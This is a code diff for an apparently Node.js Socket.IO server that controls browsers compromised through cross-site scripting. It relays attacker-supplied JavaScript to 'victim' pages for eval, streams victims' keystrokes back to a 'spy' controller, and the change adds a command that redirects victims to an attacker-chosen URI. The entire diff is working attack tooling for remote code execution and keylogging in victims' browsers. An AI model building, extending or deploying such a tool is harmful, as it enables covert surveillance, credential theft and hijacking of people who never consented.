@@ -18,7 +18,7 @@ const config = {
 
 const app = express();
 
-app.use(logger.request)
+app.use("xss", logger.request)
 app.use("/", express.static(path.join(__dirname, 'public')));
 app.use("/victim", (req, res) => {
     res.sendFile(__dirname + "/app/pages/victim.html")
@@ -27,12 +27,11 @@ app.use("/controller", (req, res) => {
     res.sendFile(__dirname + "/app/pages/controller.html")
 });
 
-
 const socketServer = http.createServer(app);
 const io = new Server(socketServer, {
     cors: {
         origin: '*',
-      }
+    }
 });
 
 const spy = io
@@ -43,6 +42,11 @@ const spy = io
         socket.on('eval', function (js) {
             logger.socketSpy(socket, 'eval', js);
             victim.emit('eval', js);
+        });
+
+        socket.on('redirect', function (uri) {
+            logger.socketSpy(socket, 'redirect', uri);
+            victim.emit('redirect', uri);
         });
 
         socket.on('disconnect', () => {
@@ -56,7 +60,7 @@ const victim = io
         logger.socketVictim(socket, '', 'connected');
 
         socket.on('type', function (key) {
-            logger.socketVictim(socket, 'type', key);
+            logger.socketVictim(socket, 'key', key);
             spy.emit('type', key);
         });
 
